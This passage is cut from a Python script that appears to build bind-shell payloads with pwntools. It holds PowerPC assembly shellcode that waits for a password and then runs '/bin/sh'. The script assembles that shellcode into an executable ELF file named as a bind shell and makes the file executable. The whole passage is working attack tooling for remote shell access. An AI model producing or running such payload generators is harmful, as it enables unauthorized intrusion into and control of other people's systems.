	addi r4, r31 ,-20
	li   r5, 8
	li   r0, 4
	sc
	lis  r20, %s
	ori  r20, r20, %s
	li   r0, 3
	li   r3, 0
	addi r4, r31, -32
	li   r5, %s
	sc
	lwz    r10, -32(r31)
	cmpw   cr7, r10,r20
	bne    cr7, 0x30;
	lis    r9, 0x2f62
	ori    r9, r9, 26990
	stw   r9, 48(r31)
	xor  r9, r9, r9
	lis    r9, 0x2f73
	ori   r9, r9, 26624
	stw   r9, 52(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	shellcode = shellcode%(handle_port, passwd_high, passwd_low, passwd_len)#, passwd_low, passwd_high, passwd_len)
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,my_package.chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 